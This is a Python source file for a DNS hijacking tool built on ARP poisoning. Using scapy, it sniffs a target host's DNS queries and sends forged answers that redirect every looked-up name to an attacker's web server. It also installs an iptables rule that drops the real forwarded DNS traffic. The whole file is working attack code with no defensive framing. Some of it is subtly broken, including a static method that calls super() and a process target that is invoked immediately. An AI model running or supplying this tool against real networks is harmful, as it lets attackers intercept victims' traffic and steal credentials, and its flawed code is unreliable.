from arp_poison import ArpPoisner

from scapy.all import DNS, DNSQR, IP, IPv6, send, UDP, sniff, DNSRR
from subprocess import Popen, PIPE
from multiprocessing import Process
import platform

class DnsHijacker(ArpPoisner):
	def __init__(self, target, webserver_ipv4):
		super().__init__(target)
		self.webserver_ipv4 = webserver_ipv4

	@staticmethod
	def setup_config():
		"""Enable IPv4 forwarding and Disables DNS Query forwarding"""

		# Enable IPv4 forwarding
		super().setup_config()

		if (platform.system() == "Linux"):
			# Disable DNS Query forwarding
			firewall = "iptables -A FORWARD -p UDP --dport 53 -j DROP"
			Popen([firewall], shell=True, stdout=PIPE)

		if (platform.system() == "Windows"):
			print("[*] Please ensure DNS forwarding is disabled")

	def dns_sniffer(self):
		sniff(filter="udp and port 53 and host " + self.target_ipv4, prn=DnsHijacker.dns_spoofer)

	def dns_spoofer(self, pkt):
		if (pkt[IP].src == self.target_ipv4 and
			pkt.haslayer(DNS) and
			pkt[DNS].qr == 0 and				# DNS Query
			pkt[DNS].opcode == 0 and			# DNS Standard Query
			pkt[DNS].ancount == 0				# Answer Count
			#pkt[DNS].qd.qname in SPOOFED_SITE	# Query domain name
			):

			print("[*] Sending spoofed DNS response")

			if (pkt.haslayer(IPv6)):
				ip_layer = IPv6(src=pkt[IPv6].dst, dst=pkt[IPv6].src)
			else:
				ip_layer = IP(src=pkt[IP].dst, dst=pkt[IP].src)


			# Create the spoofed DNS response (returning back our IP as answer
			# instead of the endpoint)
			dns_resp =  ip_layer/ \
						UDP(
							dport=pkt[UDP].sport,
							sport=53
							)/ \
						DNS(
							id=pkt[DNS].id,					# Same as query
							ancount=1,						# Number of answers
							qr=1,							# DNS Response
							ra=1,							# Recursion available
							qd=(pkt.getlayer(DNS)).qd,		# Query Data
							an=DNSRR(
								rrname=pkt[DNSQR].qname,	# Queried host name
								rdata=self.webserver_ipv4,	# IP address of queried host name
								ttl = 10
								)
							)

			# Send the spoofed DNS response
			send(dns_resp, verbose=0)
			print(f"Resolved DNS request for {pkt[DNS].qd.qname} by {self.webserver_ipv4}")



	def start(self):
		DnsHijacker.setup_config()

		# Create ARP poisoner
		process_arp_poisoner = Process(target=super().start())
		process_arp_poisoner.start()

		# Create DNS sniffer
		process_dns_sniffer = Process(target=DnsHijacker.dns_sniffer)
		process_dns_sniffer.start()

		# Wait either for the processes to complete or user to exit
		process_arp_poisoner.join()
		process_dns_sniffer.join()
